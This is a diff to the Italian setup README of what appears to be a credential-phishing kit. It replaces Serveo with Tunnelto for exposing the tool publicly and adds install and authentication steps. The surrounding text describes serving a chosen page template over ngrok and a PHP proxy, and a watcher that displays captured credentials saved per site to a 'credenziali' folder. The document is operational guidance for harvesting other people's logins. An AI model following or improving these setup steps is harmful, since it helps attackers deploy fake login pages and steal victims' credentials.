@@ -5,7 +5,7 @@ Prerequisiti (minimi)
 - pip
 - ngrok (https://ngrok.com) o altro tunnel (opzionale)
 - php (per il server PHP di test)
-- ssh (opzionale, se usi serveo)
+ - tunnelto (opzionale, per ottenere un link pubblico senza ngrok/serveo)
 
 Suggerimenti generali
 - Esegui sempre il progetto dentro un virtual environment Python per non toccare il Python di sistema.
@@ -26,6 +26,23 @@ Setup rapido (macOS / Linux)
 4) Assicurati di avere ngrok nel PATH (opzionale):
    brew install --cask ngrok (macOS, oppure scarica da ngrok.com)
 
+5) Note su Tunnelto (sostituisce l'uso di Serveo)
+
+   a) Registrati e prendi il token di accesso
+      - Vai su https://dashboard.tunnelto.dev e crea un account.
+      - Nella dashboard troverai il tuo token (access key) sulla seconda riga della pagina.
+
+   b) Installa Tunnelto
+      - macOS (Homebrew):
+         brew install tunneltodev/tap/tunnelto
+
+      - Linux (usa lo script ufficiale di installazione):
+         curl -sL https://tunnelto.dev/install.sh | sh
+
+   c) Autentica Tunnelto con il token (sostituisci TUO_TOKEN con il valore dalla dashboard):
+      
+      tunnelto set-auth --key TUO_TOKEN
+
 5) Lancia lo script principale (interattivo):
    ./start_tool.sh
 
@@ -34,7 +51,7 @@ Comportamento dello script
 - Avvia un server Flask locale (`server.py`) sulla porta 5001 che serve il template scelto.
 - Avvia ngrok per esporre il server Flask (se disponibile) e aggiorna la variabile d'ambiente `NGROK_URL` per il proxy PHP.
 - Avvia un server PHP locale su localhost:8000 che funge da proxy verso ngrok/Flask.
-- Avvia serveo via SSH per ottenere un URL pubblico (opzionale).
+ - Avvia tunnelto per ottenere un URL pubblico (opzionale).
 - Tiene aperto uno watcher che mostra in tempo reale nuove credenziali salvate in `credenziali/Credenziali_<site>.txt`.
 
 Troubleshooting rapido
@@ -56,6 +73,5 @@ Esempio: esecuzione completa
   ./start_tool.sh
   # seleziona il template (numero), attendi che ngrok/serveo vengano avviati
   # apri l'URL pubblico mostrato dallo script
-
 
 
